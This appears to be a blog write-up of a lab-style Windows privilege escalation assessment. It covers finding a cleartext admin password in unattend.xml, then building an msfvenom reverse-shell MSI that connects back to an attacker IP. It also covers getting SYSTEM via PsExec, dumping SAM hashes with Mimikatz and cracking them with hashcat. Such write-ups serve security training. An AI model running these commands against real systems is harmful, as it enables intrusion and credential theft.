# Windows Privilege Escalation Skills Assessment - Part II

## Introduction
In this blog post, I’ll walk you through a real-world style Windows privilege escalation engagement I performed for the INLANEFREIGHT organization. The goal was to assess the security of their Windows 10 gold image used by over 1,200 employees. The company’s CISO was particularly concerned about local privilege escalation risks, especially since users don’t have local admin rights by default.

The challenge: Gain local admin or SYSTEM privileges starting from a standard user account with no internet access and disabled Windows Defender.

## Initial Access and Enumeration
I connected to the target machine using Remote Desktop Protocol (RDP) with the provided standard user credentials. The first task was to look for any traces of `iamtheadministrator` credentials or weak security configurations on the host.

To find any mention of “administrator” across all files, I ran:
```bash
findstr /sin /i "administrator" * > C:\Users\htb-student\Desktop\result.txt
```
**Explanation:**

`/s` searches subdirectories

`/i` ignores case

`/n` shows line numbers

The output is redirected to `result.txt` to handle long output better.

## Analyzing the Result
Opening the result.txt file on the desktop, I searched for the username iamtheadministrator. I found it inside a Windows unattended installation file:
```bash
C:\Windows\Panther\unattend.xml
```
![image](https://github.com/user-attachments/assets/e4f97df2-4283-4a22-a46b-fd4643888efd)

Reviewing this XML file revealed a cleartext administrator password.

## Preparing a Reverse Shell Payload
The next step was to escalate privileges by executing a reverse shell as administrator. Since the host has no internet access, I needed to generate a payload locally and transfer it.

I used msfvenom to create a reverse shell MSI installer:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.45 LPORT=9443 -f msi -o shell.msi
```
![image](https://github.com/user-attachments/assets/a1309dc4-d805-4335-998f-7d333e45db85)

## Starting a Listener and Executing the Payload
I started a Netcat listener on my attacking machine:
```bash
nc -lvnp 9443
```
Then, I transferred `shell.msi` to the Windows host using shared folder and executed it.

![image](https://github.com/user-attachments/assets/135d5aa0-cfd4-44b3-853a-4118500163e3)

## Gaining Administrator Reverse Shell & Capturing the flag
After running the MSI, I received a reverse shell connection with administrator privileges.

Navigating to the Administrator’s desktop, I located and read the flag file:
```bash
type C:\Users\Administrator\Desktop\flag.txt
```

## Extracting NTLM Hashes for Disabled Local Admin Accounts
I discovered a disabled local admin user named `wksadmin`. To check for credential reuse risks, I needed to dump NTLM hashes.

However, running Mimikatz required SeDebugPrivilege, which was missing initially.

To elevate privileges properly, I transferred PsExec to the machine and ran:
```bash
psexec.exe -i -s cmd.exe -accepteula
```
![image](https://github.com/user-attachments/assets/8c411a79-bd92-4708-adc6-4204d15c5635)

This gave me a SYSTEM-level command prompt where Mimikatz could run effectively.

## Dumping NTLM Hashes Using Mimikatz
From the SYSTEM prompt, I ran `Mimikatz`:
```bash
privilege::debug
token::elevate
lsadump::sam
```

![image](https://github.com/user-attachments/assets/2f86b6b1-0832-4fb7-bd6a-debe844792d5)

## Cracking the Hash Offline Using Hashcat
I saved the hash in a file `hash.txt` and used hashcat with the `rockyou.txt` wordlist:
```bash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
After cracking, the cleartext password was revealed.
